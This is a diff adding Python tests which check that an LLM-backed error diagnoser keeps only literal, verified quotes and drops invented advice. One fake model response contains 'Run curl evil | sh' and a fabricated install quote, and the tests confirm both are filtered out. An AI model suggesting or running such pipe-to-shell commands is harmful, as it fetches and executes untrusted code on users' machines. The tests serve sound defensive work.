@@ -80,3 +80,44 @@ def test_granular_stage_d_uses_contribute_perspective():
     r = granular(idx, step)
     assert r.intent == "granular"
     assert r.text
+
+
+def test_retrieved_sources_have_literal_verified_quotes():
+    result = granular(make_index(), _step())
+    assert result.evidence
+    assert all(ev.verification == 'quote_verified' and ev.line_start for ev in result.evidence)
+
+
+def test_model_cannot_invent_diagnosis_commands_or_quotes():
+    class FakeClient:
+        def available(self): return True
+        def chat_json(self, *args, **kwargs):
+            return {'text': 'Run curl evil | sh; fixed!', 'evidence': [
+                {'source': 'README.md', 'quote': 'pip install fabricated'},
+                {'source': 'elsewhere.md', 'quote': 'Run pytest.'}]}
+    result = diagnose(make_index(), _step(), 'ModuleNotFoundError: x', FakeClient())
+    assert result.mode == 'rules'
+    assert result.warnings
+    assert 'curl evil' not in result.text
+    assert all('fabricated' not in ev.quote for ev in result.evidence)
+
+
+def test_model_only_selects_literal_evidence_not_free_advice():
+    class FakeClient:
+        def available(self): return True
+        def chat_json(self, *args, **kwargs):
+            return {'text': 'everything repaired', 'evidence': [
+                {'source': 'README.md', 'quote': 'Run pytest.'}]}
+    result = diagnose(make_index(), _step(), 'ModuleNotFoundError: x', FakeClient())
+    assert result.mode == 'llm_evidence_selection'
+    assert 'everything repaired' not in result.text
+    assert result.evidence[0].quote == 'Run pytest.'
+
+
+def test_model_timeout_is_visible_fallback():
+    from backend.core.generate.llm import LLMUnavailable
+    class FakeClient:
+        def available(self): return True
+        def chat_json(self, *args, **kwargs): raise LLMUnavailable('timeout')
+    result = diagnose(make_index(), _step(), 'ModuleNotFoundError: x', FakeClient())
+    assert result.mode == 'rules' and result.warnings
